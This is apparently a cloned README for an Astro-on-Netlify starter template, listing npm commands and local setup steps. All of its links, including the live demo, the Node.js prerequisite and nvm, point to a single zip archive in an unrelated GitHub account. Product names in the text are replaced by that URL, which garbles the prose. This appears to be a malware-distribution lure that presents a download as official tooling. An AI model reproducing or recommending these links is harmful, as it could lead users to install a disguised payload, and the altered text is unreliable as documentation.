# Astro on Netlify Platform Starter

[Live Demo](https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip)

A modern starter based on https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip) (Edge Functions, Image CDN, Blobs).

## Astro Commands

All commands are run from the root of the project, from a terminal:

| Command                   | Action                                           |
| :------------------------ | :----------------------------------------------- |
| `npm install`             | Installs dependencies                            |
| `npm run dev`             | Starts local dev server at `localhost:4321`      |
| `npm run build`           | Build your production site to `./dist/`          |
| `npm run preview`         | Preview your build locally, before deploying     |
| `npm run astro ...`       | Run CLI commands like `astro add`, `astro check` |
| `npm run astro -- --help` | Get help using the Astro CLI                     |

## Developing Locally

| Prerequisites                                                                |
| :--------------------------------------------------------------------------- |
| [https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip](https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip) v18.20.8+.                                    |
| (optional) [nvm](https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip) for Node version management. |

1. Clone this repository, then run `npm install` in its root directory.

2. Recommended: link your local repository to a Netlify project. This will ensure you're using the same runtime version for both local development and your deployed project.

```
netlify link
```

3. Run the https://raw.githubusercontent.com/demisuperad123/astro-platform-starter/main/src/pages/edge/not-australia/astro-starter-platform-1.2.zip development server:

```
npm run dev
```
